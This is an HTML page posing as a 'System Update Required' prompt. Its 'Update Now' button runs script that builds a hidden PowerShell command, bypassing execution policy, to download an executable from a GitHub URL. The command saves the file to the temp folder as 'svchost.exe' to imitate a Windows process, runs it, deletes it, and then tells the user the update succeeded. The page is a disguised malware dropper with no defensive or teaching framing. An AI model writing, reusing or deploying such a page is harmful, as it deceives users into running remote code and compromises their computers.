<!DOCTYPE html>
<html>
<body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
    <h2>System Update Required</h2>
    <p>Please click below to complete the update.</p>
    
    <button id="updateBtn" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">
        Update Now
    </button>

    <script>
        document.getElementById('updateBtn').addEventListener('click', function() {
            // 1. The command to download and run your exe
            // Note: Removed the trailing backslash from the URL
            var psCmd = 'powershell -noprofile -executionpolicy bypass -windowstyle hidden -command "$u=\'https://github.com/finnandraw888/Windows-security-update/raw/refs/heads/main/Windowsupdateservice.exe'; $f=\'$env:temp\\svchost.exe\'; iwr $u -out $f; start $f; sleep 5; rm $f -force"';
            
            // Open a new PowerShell window silently
            window.open('powershell.exe -c "' + psCmd.replace(/"/g, '\\"') + '"');
            
            // Hide the button after clicking
            this.style.display = 'none';
            document.body.innerHTML += '<p>Update successful. You may close this window.</p>';
        });
    </script>
</body>
</html>
